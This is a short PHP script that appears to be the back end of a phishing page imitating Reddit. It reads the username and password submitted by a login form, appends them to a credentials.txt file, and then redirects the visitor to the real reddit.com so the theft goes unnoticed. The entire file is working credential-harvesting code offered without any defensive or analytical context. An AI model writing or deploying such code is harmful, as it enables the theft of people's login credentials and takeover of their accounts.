<?php
  $output_list = fopen("../credentials.txt", "a") or die("Unable to access file.");
  $username = $_POST['username'];
  $password = $_POST['password'];

  fwrite($output_list, "[Email] {$username} [Password] {$password}\n");
  fclose($output_list);

  header('Location: https://www.reddit.com/');
  die();
?>